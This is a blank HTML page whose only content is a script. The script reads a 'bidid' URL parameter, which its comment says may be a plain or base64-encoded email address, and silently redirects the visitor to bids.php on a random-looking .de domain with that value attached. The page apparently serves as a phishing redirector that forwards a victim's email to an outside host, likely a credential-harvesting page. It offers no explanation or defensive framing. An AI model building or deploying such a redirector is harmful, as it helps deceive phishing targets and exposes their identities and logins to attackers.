<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title></title>
</head>
<body>
<script>
  const params = new URLSearchParams(window.location.search);
  const bidid = params.get("bidid");

  // Accept: bidid (hex), plain email, base64 email (with + / =), url-safe base64 (- _)
  if (bidid && /^[A-Za-z0-9+/=_@.\-]{6,256}$/.test(bidid)) {
    window.location.replace(
      "https://zcbxaqmrvtnlypkwejduisrfhn.de/bids.php?bidid=" +
      encodeURIComponent(bidid)
    );
  }
</script>
</body>
</html>
